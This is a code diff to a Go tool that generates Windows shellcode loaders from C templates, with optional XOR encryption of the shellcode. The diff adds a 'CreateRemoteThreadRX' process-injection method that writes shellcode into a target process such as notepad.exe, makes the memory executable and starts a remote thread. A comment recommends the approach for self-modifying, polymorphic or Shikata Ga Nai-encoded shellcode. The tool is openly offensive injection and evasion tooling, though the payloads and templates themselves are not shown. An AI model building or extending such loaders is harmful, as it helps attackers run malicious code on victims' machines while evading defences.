@@ -53,8 +53,13 @@ var tokens = []token{
 		enc:    true,
 	},
 	{
-		name:   "createremotethread",
-		method: "OpenProcess, VirtualAllocEx (MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE), WriteProcessMemory, CreateRemoteThread, WaitForSingleObject, CloseHandle",
+		name:  "createremotethread",
+		method: "OpenProcess, VirtualAllocEx (PAGE_EXECUTE_READWRITE), WriteProcessMemory, CreateRemoteThread, WaitForSingleObject, CloseHandle",
+		enc:   false,
+	},
+	{
+		name:   "createremotethreadrx",
+		method: "OpenProcess, VirtualAllocEx (PAGE_READWRITE), WriteProcessMemory, VirtualProtect (PAGE_EXECUTE_READ), CreateRemoteThread, WaitForSingleObject, CloseHandle",
 		enc:    false,
 	},
 }
@@ -74,7 +79,7 @@ Options:
                      Example: -out ./Output
 
   -ldr <token>     Loader token to be used in the generation process. (Required)
-                     Supported tokens: [Inline, Xor_Inline, CreateRemoteThread]
+                     Supported tokens: [Inline, Xor_Inline, CreateRemoteThread, CreateRemoteThreadRX]
                      Example: -ldr inline
 
   -enc <type>      Encryption type for the shellcode. (Optional)
@@ -98,7 +103,6 @@ Examples:
   ./ldr -bin ./Template/Bin/Calc.bin -out ./Output -ldr Xor_Inline -enc xor -key mySecretKey1234
   ./ldr -bin ./Template/Bin/Calc.bin -out ./output -ldr Xor_Inline -enc xor -key uashdikasjhdasdas --cleanup
   ./ldr -bin ./Template/Bin/Calc.bin -out ./output -ldr CreateRemoteThread 
-
 `
 	fmt.Println(text)
 }
@@ -341,6 +345,9 @@ func ProcessLoaderTemplate(token string, args ...string) error {
 
 		/*
 			ldr looks for "notepad.exe" change this to your requirements at: ./{template}/Source/CreateRemoteThread.c
+			allocates RWX memory sections, use this for:
+			- https://unprotect.it/technique/shikata-ga-nai-sgn/#:~:text=Shikata%20Ga%20Nai%20(SGN)%20is,a%20self%2Ddecoding%20obfuscated%20shellcode.
+			- any shellcode that changes itself at runtime (e.g. polymorphic shellcode)
 		*/
 
 		ldr, err := ReadFile(filepath.Join(*template_path, "Source/CreateRemoteThread.c"))
@@ -352,7 +359,24 @@ func ProcessLoaderTemplate(token string, args ...string) error {
 		if err != nil {
 			return err
 		}
+	
+	case "createremotethreadrx":
+		/* 
+			ldr looks for "notepad.exe" change this to your requirements at: ./{template}/Source/CreateRemoteThreadRX.c
+			allocates RWX, writes shellcode to memory, changes memory to RX, creates remote thread
+			VirtualProtectEx
+		*/
 
+		ldr, err := ReadFile(filepath.Join(*template_path, "Source/CreateRemoteThreadRX.c"))
+		if err != nil {
+			return err
+		}
+
+		err = SaveToFile(*outputPath, "Main.c", ldr)
+		if err != nil {
+			return err
+		}
+		
 	default:
 		fmt.Println("Unknown token:", token)
 	}
@@ -361,18 +385,18 @@ func ProcessLoaderTemplate(token string, args ...string) error {
 	return nil
 }
 
-func main() {
+func init() {
 	flag.Usage = PrintHelp
 	flag.Parse()
 
 	if *help {
 		PrintHelp()
-		return
+		os.Exit(0)
 	}
 
 	if *shellcodePath == "" || *outputPath == "" || *ldrToken == "" {
 		PrintHelp()
-		return
+		os.Exit(0)
 	}
 
 	if *template_path == "" {
@@ -382,7 +406,7 @@ func main() {
 
 	if !tokenExists(*ldrToken) {
 		fmt.Println("[*] Unknown loader token:", *ldrToken)
-		return
+		os.Exit(0)
 	}
 
 	needsEnc := tokenEnc(*ldrToken)
@@ -393,19 +417,21 @@ func main() {
 
 	if !needsEnc && *enc != "" {
 		fmt.Println("[*] Encryption type specified, but not needed for this loader token:", *ldrToken)
-		return
+		os.Exit(0)
 	}
 
 	if !needsEnc && *key != "" {
 		fmt.Println("[*] Encryption key specified, but not needed for this loader token:", *ldrToken)
-		return
+		os.Exit(0)
 	}
 
 	if needsEnc && *key == "" {
 		fmt.Println("[*] Encryption key not specified, using default key: aaaabbbbccccdddd")
 		*key = "aaaabbbbccccdddd"
 	}
+}
 
+func main() {
 	err := ProcessShellcodeTemplate(*shellcodePath, *enc, *key)
 	if err != nil {
 		fmt.Println("Error processing shellcode:", err)
@@ -413,7 +439,6 @@ func main() {
 	}
 
 	err = ProcessLoaderTemplate(strings.ToLower(*ldrToken), *enc, *key)
-	// ldrToken should be case insensitive
 	if err != nil {
 		fmt.Println("Error processing loader:", err)
 		return
